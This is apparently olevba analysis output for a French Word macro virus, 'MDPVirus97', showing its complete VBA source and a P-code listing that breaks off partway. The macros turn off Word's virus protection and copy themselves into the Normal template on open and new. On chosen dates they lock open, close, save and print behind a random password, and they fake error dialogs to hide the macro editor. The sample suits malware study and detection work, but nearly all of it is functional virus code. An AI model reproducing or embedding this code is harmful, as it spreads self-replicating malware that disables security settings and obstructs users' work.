olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mdpvirus
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mdpvirus - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MDPVirus97.bas 
in file: Virus.MSWord.Mdpvirus - OLE stream: 'Macros/VBA/MDPVirus97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAE
Dim MyDate
MyDate = Date
DT$ = Mid(MyDate, 1, 2)
If DT$ = "01" Or DT$ = "11" Or DT$ = "21" Or DT$ = "30" Then
    MsgBox "ZeMacroKiller vous dit:" & Chr$(13) & "Mot De Passe pour accéder à certain menu", vbCritical, "MDPVirus 97"
End If
ErrorAE:
End Sub
Sub AutoNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAN
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "MDPVirus97" Then
        MDPVirus97Installed = -1
    End If
Next i
If Not MDPVirusInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MDPVirus97", Object:=wdOrganizerObjectProjectItems
    MsgBox "HAHAHAHAHA!!!!!", vbCritical, "MDPVirus 97"
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MDPVirus97", Object:=wdOrganizerObjectProjectItems
End If
ErrorAN:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "MDPVirus97" Then
        MDPVirus97Installed = -1
    End If
Next i
If Not MDPVirusInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MDPVirus97", Object:=wdOrganizerObjectProjectItems
    MsgBox "Je suis là!!!!!!", vbCritical, "MDPVirus 97"
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MDPVirus97", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Save
End If
ErrorAO:
End Sub
Sub FileOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFO
Dim MyDate
MyDate = Date
DT$ = Mid(MyDate, 1, 2)
If DT$ = "01" Then
    Call MDPV97
    MDP$ = InputBox("Pour acceder à ce menu," & Chr$(13) & "Veuillez entrer le mot de passe du jour:", Title:="MDPVirus97")
    WOpen$ = WordBasic.[GetPrivateProfileString$]("MotDePasse", "Valeur", "Win.ini")
    If WOpen$ <> MDP$ Or WOpen$ = "" Then
        MsgBox "MOT DE PASSE INCORRECTE!!!" & Chr$(13) & "Accès Refusé!!!" & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "MDPVirus97"
        GoTo Fin
    End If
    If WOpen$ = MDP$ Then
        MsgBox "MOT DE PASSE CORRECTE!!!!" & Chr$(13) & "Impossible...", vbInformation, "MDPVirus97"
        Dialogs(wdDialogFileOpen).Show
    End If
Else
    Dialogs(wdDialogFileOpen).Show
End If
Fin:
ErrorFO:
End Sub
Sub FileClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFC
Dim MyDate
MyDate = Date
DT$ = Mid(MyDate, 1, 2)
If DT$ = "11" Then
    Call MDPV97
    MDP$ = InputBox("Pour acceder à ce menu," & Chr$(13) & "Veuillez entrer le mot de passe du jour:", Title:="MDPVirus97")
    WOpen$ = WordBasic.[GetPrivateProfileString$]("MotDePasse", "Valeur", "Win.ini")
    If WOpen$ <> MDP$ Or WOpen$ = "" Then
        MsgBox "MOT DE PASSE INCORRECTE!!!" & Chr$(13) & "Utilisation Impossible!!!" & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "MDPVirus97"
        GoTo Fin
    End If
    If WOpen$ = MDP$ Then
        MsgBox "MOT DE PASSE CORRECTE!!!!" & Chr$(13) & "T'es un bon...", vbInformation, "MDPVirus97"
        Application.Run MacroName:="FichierFermer"
    End If
Else
    Application.Run MacroName:="FichierFermer"
End If
Fin:
ErrorFC:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
Dim MyDate
MyDate = Date
DT$ = Mid(MyDate, 1, 2)
If DT$ = "21" Then
    Call MDPV97
    MDP$ = InputBox("Pour acceder à ce menu," & Chr$(13) & "Veuillez entrer le mot de passe du jour:", Title:="MDPVirus97")
    WOpen$ = WordBasic.[GetPrivateProfileString$]("MotDePasse", "Valeur", "Win.ini")
    If WOpen$ <> MDP$ Or WOpen$ = "" Then
        MsgBox "MOT DE PASSE INCORRECTE!!!" & Chr$(13) & "Enregistrement inutilisable!!!" & Chr$(13) & "Dommage pour toi!!!!", vbCritical, "MDPVirus97"
        GoTo Fin
    End If
    If WOpen$ = MDP$ Then
        MsgBox "MOT DE PASSE CORRECTE!!!!" & Chr$(13) & "Mais, COMMENT as tu fait ?...", vbInformation, "MDPVirus97"
        Dialogs(wdDialogFileSaveAs).Show
        If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
    End If
Else
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
End If
Fin:
ErrorFSA:
End Sub
Sub FilePrint()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFP
Dim MyDate
MyDate = Date
DT$ = Mid(MyDate, 1, 2)
If DT$ = "30" Then
    Call MDPV97
    MDP$ = InputBox("Pour acceder à ce menu," & Chr$(13) & "Veuillez entrer le mot de passe du jour:", Title:="MDPVirus97")
    WOpen$ = WordBasic.[GetPrivateProfileString$]("MotDePasse", "Valeur", "Win.ini")
    If WOpen$ <> MDP$ Or WOpen$ = "" Then
        MsgBox "MOT DE PASSE INCORRECTE!!!" & Chr$(13) & "Menu Impression Inaccessible!!!" & Chr$(13) & "Essai Plus Tard!!!!", vbCritical, "MDPVirus97"
        GoTo Fin
    End If
    If WOpen$ = MDP$ Then
        MsgBox "MOT DE PASSE CORRECTE!!!!" & Chr$(13) & "Impression Autorisé...", vbInformation, "MDPVirus97"
        Dialogs(wdDialogFilePrint).Show
    End If
Else
    Dialogs(wdDialogFilePrint).Show
End If
Fin:
ErrorFP:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    MsgBox "Espace Mémoire Insuffisant.", vbCritical, "Microsoft Word"
ErrorFT:
End Sub
Private Sub MDPV97()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorMDPV97
Randomize
For i = 1 To 8
N$ = Int(Rnd * 15) + 1
If N$ = "1" Then
    Valeur$ = "A"
End If
If N$ = "2" Then
    Valeur$ = "B"
End If
If N$ = "3" Then
    Valeur$ = "C"
End If
If N$ = "4" Then
    Valeur$ = "D"
End If
If N$ = "5" Then
    Valeur$ = "E"
End If
If N$ = "6" Then
    Valeur$ = "F"
End If
If N$ = "7" Then
    Valeur$ = "G"
End If
If N$ = "8" Then
    Valeur$ = "H"
End If
If N$ = "9" Then
    Valeur$ = "I"
End If
If N$ = "10" Then
    Valeur$ = "J"
End If
If N$ = "11" Then
    Valeur$ = "§"
End If
If N$ = "12" Then
    Valeur$ = "*"
End If
If N$ = "13" Then
    Valeur$ = "¤"
End If
If N$ = "14" Then
    Valeur$ = "@"
End If
If N$ = "15" Then
    Valeur$ = "%"
End If
If i = 1 Then a$ = Valeur$
If i = 2 Then b$ = Valeur$
If i = 3 Then c$ = Valeur$
If i = 4 Then d$ = Valeur$
If i = 5 Then e$ = Valeur$
If i = 6 Then f$ = Valeur$
If i = 7 Then g$ = Valeur$
If i = 8 Then h$ = Valeur$
Next i
Total$ = a$ + b$ + c$ + d$ + e$ + f$ + g$ + h$
WordBasic.SetPrivateProfileString "MotDePasse", "Valeur", Total$, "Win.ini"
ErrorMDPV97:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    MsgBox "Une erreur est survenu lors de l'utilisation de cette fonction.", vbCritical, "Microsoft Word"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mdpvirus
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/MDPVirus97 - 20851 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	OnError ErrorAE 
' Line #5:
' 	Dim 
' 	VarDefn MyDate
' Line #6:
' 	Ld Date 
' 	St MyDate 
' Line #7:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St DT$ 
' Line #8:
' 	Ld DT$ 
' 	LitStr 0x0002 "01"
' 	Eq 
' 	Ld DT$ 
' 	LitStr 0x0002 "11"
' 	Eq 
' 	Or 
' 	Ld DT$ 
' 	LitStr 0x0002 "21"
' 	Eq 
' 	Or 
' 	Ld DT$ 
' 	LitStr 0x0002 "30"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0017 "ZeMacroKiller vous dit:"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0028 "Mot De Passe pour accéder à certain menu"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000B "MDPVirus 97"
' 	ArgsCall MsgBox 0x0003 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	Label ErrorAE 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Sub AutoNew())
' Line #14:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #15:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	OnError ErrorAN 
' Line #18:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #20:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000A "MDPVirus97"
' 	Eq 
' 	IfBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	UMi 
' 	St MDPVirus97Installed 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	Ld MDPVirusInstalled 
' 	Not 
' 	IfBlock 
' Line #25:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "MDPVirus97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #26:
' 	LitStr 0x000F "HAHAHAHAHA!!!!!"
' 	Ld vbCritical 
' 	LitStr 0x000B "MDPVirus 97"
' 	ArgsCall MsgBox 0x0003 
' Line #27:
' 	ElseBlock 
' Line #28:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "MDPVirus97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Label ErrorAN 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub AutoOpen())
' Line #33:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #34:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #35:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #36:
' 	OnError ErrorAO 
' Line #37:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #39:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000A "MDPVirus97"
' 	Eq 
' 	IfBlock 
' Line #40:
' 	LitDI2 0x0001 
' 	UMi 
' 	St MDPVirus97Installed 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	Ld MDPVirusInstalled 
' 	Not 
' 	IfBlock 
' Line #44:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "MDPVirus97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #45:
' 	LitStr 0x0010 "Je suis là!!!!!!"
' 	Ld vbCritical 
' 	LitStr 0x000B "MDPVirus 97"
' 	ArgsCall MsgBox 0x0003 
' Line #46:
' 	ElseBlock 
' Line #47:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "MDPVirus97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Label ErrorAO 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub FileOpen())
' Line #53:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #54:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #55:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #56:
' 	OnError ErrorFO 
' Line #57:
' 	Dim 
' 	VarDefn MyDate
' Line #58:
' 	Ld Date 
' 	St MyDate 
' Line #59:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St DT$ 
' Line #60:
' 	Ld DT$ 
' 	LitStr 0x0002 "01"
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) MDPV97 0x0000 
' Line #62:
' 	LitStr 0x0017 "Pour acceder à ce menu,"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0028 "Veuillez entrer le mot de passe du jour:"
' 	Concat 
' 	LitStr 0x000A "MDPVirus97"
' 	ParamNamed Title 
' 	ArgsLd InputBox 0x0002 
' 	St MDP$ 
' Line #63:
' 	LitStr 0x000A "MotDePasse"
' 	LitStr 0x0006 "Valeur"
' 	LitStr 0x0007 "Win.ini"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WOpen$ 
' Line #64:
' 	Ld WOpen$ 
' 	Ld MDP$ 
' 	Ne 
' 	Ld WOpen$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #65:
' 	LitStr 0x001A "MOT DE PASSE INCORRECTE!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000F "Accès Refusé!!!"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000E "HAHAHAHAHA!!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000A "MDPVirus97"
' 	ArgsCall MsgBox 0x0003 
' Line #66:
' 	GoTo Fin 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Ld WOpen$ 
' 	Ld MDP$ 
' 	Eq 
' 	IfBlock 
' Line #69:
' 	LitStr 0x0019 "MOT DE PASSE CORRECTE!!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000D "Impossible..."
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000A "MDPVirus97"
' 	ArgsCall MsgBox 0x0003 
' Line #70:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	ElseBlock 
' Line #73:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	Label Fin 
' Line #76:
' 	Label ErrorFO 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Sub FileClose())
' Line #79:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #80:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #81:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #82:
' 	OnError ErrorFC 
' Line #83:
' 	Dim 
' 	VarDefn MyDate
' Line #84:
' 	Ld Date 
' 	St MyDate 
' Line #85:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St DT$ 
' Line #86:
' 	Ld DT$ 
' 	LitStr 0x0002 "11"
' 	Eq 
' 	IfBlock 
' Line #87:
' 	ArgsCall (Call) MDPV97 0x0000 
' Line #88:
' 	LitStr 0x0017 "Pour acceder à ce menu,"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0028 "Veuillez entrer le mot de passe du jour:"
' 	Concat 
' 	LitStr 0x000A "MDPVirus97"
' 	ParamNamed Title 
' 	ArgsLd InputBox 0x0002 
' 	St MDP$ 
' Line #89:
' 	LitStr 0x000A "MotDePasse"
' 	LitStr 0x0006 "Valeur"
' 	LitStr 0x0007 "Win.ini"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WOpen$ 
' Line #90:
' 	Ld WOpen$ 
' 	Ld MDP$ 
' 	Ne 
' 	Ld WOpen$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #91:
' 	LitStr 0x001A "MOT DE PASSE INCORRECTE!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0019 "Utilisation Impossible!!!"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000E "HAHAHAHAHA!!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000A "MDPVirus97"
' 	ArgsCall MsgBox 0x0003 
' Line #92:
' 	GoTo Fin 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	Ld WOpen$ 
' 	Ld MDP$ 
' 	Eq 
' 	IfBlock 
' Line #95:
' 	LitStr 0x0019 "MOT DE PASSE CORRECTE!!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000E "T'es un bon..."
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000A "MDPVirus97"
' 	ArgsCall MsgBox 0x0003 
' Line #96:
' 	LitStr 0x000D "FichierFermer"
' 	ParamNamed MacroName 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	ElseBlock 
' Line #99:
' 	LitStr 0x000D "FichierFermer"
' 	ParamNamed MacroName 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	Label Fin 
' Line #102:
' 	Label ErrorFC 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Sub FileSaveAs())
' Line #105:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #106:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #107:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #108:
' 	OnError ErrorFSA 
' Line #109:
' 	Dim 
' 	VarDefn MyDate
' Line #110:
' 	Ld Date 
' 	St MyDate 
' Line #111:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St DT$ 
' Line #112:
' 	Ld DT$ 
' 	LitStr 0x0002 "21"
' 	Eq 
' 	IfBlock 
' Line #113:
' 	ArgsCall (Call) MDPV97 0x0000 
' Line #114:
' 	LitStr 0x0017 "Pour acceder à ce menu,"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0028 "Veuillez entrer le mot de passe du jour:"
' 	Concat 
' 	LitStr 0x000A "MDPVirus97"
' 	ParamNamed Title 
' 	ArgsLd InputBox 0x0002 
' 	St MDP$ 
' Line #115:
' 	LitStr 0x000A "MotDePasse"
' 	LitStr 0x0006 "Valeur"
' 	LitStr 0x0007 "Win.ini"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WOpen$ 
' Line #116:
' 	Ld WOpen$ 
' 	Ld MDP$ 
' 	Ne 
' 	Ld WOpen$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #117:
' 	LitStr 0x001A "MOT DE PASSE INCORRECTE!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x001E "Enregistrement inutilisable!!!"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0014 "Dommage pour toi!!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000A "MDPVirus97"
' 	ArgsCall MsgBox 0x0003 
' Line #118:
' 	GoTo Fin 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	Ld WOpen$ 
' 	Ld MDP$ 
' 	Eq 
' 	IfBlock 
' Line #121:
' 	LitStr 0x0019 "MOT DE PASSE CORRECTE!!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x001D "Mais, COMMENT as tu fait ?..."
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000A "MDPVirus97"
' 	ArgsCall MsgBox 0x0003 
' Line #122:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #123:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #124:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	ElseBlock 
' Line #128:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #129:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #130:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	Label Fin 
' Line #134:
' 	Label ErrorFSA 
' Line #135:
' 	EndSub 
' Line #136:
' 	FuncDefn (Sub FilePrint())
' Line #137:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #138:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #139:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #140:
' 	OnError ErrorFP 
' Line #141:
' 	Dim 
' 	VarDefn MyDate
' Line #142:
' 	Ld Date 
' 	St MyDate 
' Line #143:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St DT$ 
' Line #144:
' 	Ld DT$ 
' 	LitStr 0x0002 "30"
' 	Eq 
' 	IfBlock 
' Line #145:
' 	ArgsCall (Call) MDPV97 0x0000 
' Line #146:
' 	LitStr 0x0017 "Pour acceder à ce menu,"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0028 "Veuillez entrer le mot de passe du jour:"
' 	Concat 
' 	LitStr 0x000A "MDPVirus97"
' 	ParamNamed Title 
' 	ArgsLd InputBox 0x0002 
' 	St MDP$ 
' Line #147:
' 	LitStr 0x000A "MotDePasse"
' 	LitStr 0x0006 "Valeur"
' 	LitStr 0x0007 "Win.ini"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WOpen$ 
' Line #148:
' 	Ld WOpen$ 
' 	Ld MDP$ 
' 	Ne 
' 	Ld WOpen$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #149:
' 	LitStr 0x001A "MOT DE PASSE INCORRECTE!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x001F "Menu Impression Inaccessible!!!"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Essai Plus Tard!!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000A "MDPVirus97"
' 	ArgsCall MsgBox 0x0003 
' Line #150:
' 	GoTo Fin 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	Ld WOpen$ 
' 	Ld MDP$ 
' 	Eq 
' 	IfBlock 
' Line #153:
' 	LitStr 0x0019 "MOT DE PASSE CORRECTE!!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0016 "Impression Autorisé..."
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000A "MDPVirus97"
' 	ArgsCall MsgBox 0x0003 
' Line #154:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	ElseBlock 
' Line #157:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
